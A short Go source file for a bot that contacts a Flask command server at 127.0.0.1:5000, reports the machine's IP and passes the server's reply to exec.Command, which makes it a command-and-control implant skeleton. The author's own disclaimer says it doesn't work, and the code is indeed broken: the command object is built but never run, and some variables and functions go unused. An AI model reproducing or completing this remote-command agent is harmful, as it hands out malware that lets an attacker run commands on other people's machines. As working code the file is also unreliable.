// Golang bot to pull commands from webserver and execute them
// Disclaimer: This doesn't work
// @author: degenerat3

package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

var serv = "127.0.0.1:5000" //IP of flask serv
var loopTime = 10           //sleep time in secs

// get hostname and return it as a string
func getHn() string {
	hn, _ := os.Hostname()
	return hn
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	ipStr = strings.Replace(ipStr, ".", "-", 10)
	return ipStr
}

func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/api/callback/" + ip
	r, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("commands: \n%s\n", txt)
	exec.Command(string(txt))
}

func main() {
	getCommands()

}
